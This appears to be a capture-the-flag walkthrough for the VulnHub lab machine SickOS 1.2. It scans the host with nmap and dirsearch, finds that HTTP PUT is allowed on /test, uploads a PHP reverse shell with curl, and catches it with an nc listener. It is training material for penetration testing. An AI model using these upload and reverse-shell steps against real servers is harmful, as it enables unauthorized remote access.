<div class="page">

# SickOS : 1.2

\

## 

## SickOS : 1.2

- **<span style="color:#8ff0a4;">SickOS : 1.2</span>** :-

<!-- -->

- Download the machine : <https://www.vulnhub.com/entry/sickos-12,144/>

![](images/6-1.png)

- Now unzip the file :

![](images/6-2.png)

![](images/6-3.png)

- Then start the machine .

<!-- -->

- Automatic not assign IP to the machine :

![](images/6-4.png)

- Run nmap command to scan<span style="color:#33d17a;"> </span> :

<!-- -->

- Find the machine ip :

<div class="codebox">

    nmap -sn 192.168.2.0/24 

</div>

![](images/6-5.png)

- Find the available port :

<div class="codebox">

    nmap -v -p- 192.168.2.175

</div>

![](images/6-6.png)

- Check the port what is running on these port :

<div class="codebox">

    nmap -v -sT -sV -sC -A -O -p 80,22 192.168.2.175

</div>

![](images/6-7.png)

- Now check what is running in this ip : <http://192.168.2.175/>

![](images/6-8.png)

- Now run the dirsearch command :

<div class="codebox">

    dirsearch -u http://192.168.2.175/

</div>

![](images/6-9.png)

- Parameter search in browser : <http://192.168.2.175/test/>

![](images/6-10.png) Directory listening enable .

- Allowed HTTP Methods on Port 80 :

<!-- -->

- Using nmap to Enumerate Supported Methods :

<div class="codebox">

    nmap -v -Pn -sT -sV -p 80 --script http-methods.nse 192.168.2.175

</div>

![](images/6-11.png)

- With URL Path Specification :

<div class="codebox">

    nmap -v -Pn -sT -sV -p 80 --script http-methods.nse --script-args http-methods.url-path='/test' 192.168.2.175

</div>

![](images/6-12.png)

- Using curl to Check OPTIONS :

<div class="codebox">

    curl -v -X OPTIONS http://192.168.2.175/test

</div>

![](images/6-13.png)

- Example Usage of HTTP Methods with curl :

<!-- -->

- GET :

<div class="codebox">

    curl -X GET http://192.168.2.175/test

</div>

- HEAD :

<div class="codebox">

    curl -I http://192.168.2.175/test

</div>

![](images/6-14.png)

- POST :

<div class="codebox">

    curl --request POST --url http://192.168.2.175/test/post.php --header 'Content-Type: application/x-www-form-urlencoded' --data 'demo2'

</div>

- PUT – Upload a File :

<!-- -->

- php-reverse-shell download here :
  <https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php>

<!-- -->

- Edit the file :

<div class="codebox">

    vim php-reverse-shell.php

</div>

![](images/6-15.png) kali k ip dena h .

<div class="codebox">

    curl -T php-reverse-shell.php http://192.168.2.175/test/

</div>

Or with explicit method :

<div class="codebox">

    curl -X PUT -T php-reverse-shell.php http://192.168.2.175/test/

</div>

Or uploading as data :

<div class="codebox">

    curl -X PUT -d '<?php phpinfo(); ?>' http://192.168.2.175/test/phpinfo.php

</div>

![](images/6-16.png)

![](images/6-17.png)

- Now take a reverse shell :

<div class="codebox">

    nc -nlvp 443

</div>

<div class="codebox">

    curl -X PUT -T php-reverse-shell.php http://192.168.2.175/test/

</div>

![](images/6-18.png)

![](images/6-19.png)

Click on file take a reverse shell :

![](images/6-20.png)

</div>
